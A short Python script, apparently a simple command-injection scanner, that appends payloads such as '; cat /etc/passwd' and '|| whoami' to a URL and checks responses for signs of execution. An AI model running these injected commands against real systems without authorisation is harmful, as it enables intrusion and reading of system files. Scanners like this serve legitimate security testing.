import requests

def scan_command_injection(url):
    command_injection_payloads = [
        "; ls",                           # List files
        "; cat /etc/passwd",              # Extract passwd file
        "|| whoami",                      # User check
        "& echo vulnerable",              # Command injection
        "| ping -c 1 127.0.0.1",          # Ping localhost
    ]
    
    results = []
    
    for payload in command_injection_payloads:
        test_url = url + payload
        try:
            response = requests.get(test_url)
            if "root:" in response.text or "vulnerable" in response.text:
                results.append(f"Command Injection Vulnerability Found: {test_url}")
        except requests.exceptions.RequestException as e:
            results.append(f"Error scanning {url}: {str(e)}")
    
    if not results:
        return "No Command Injection vulnerabilities found."
    
    return results
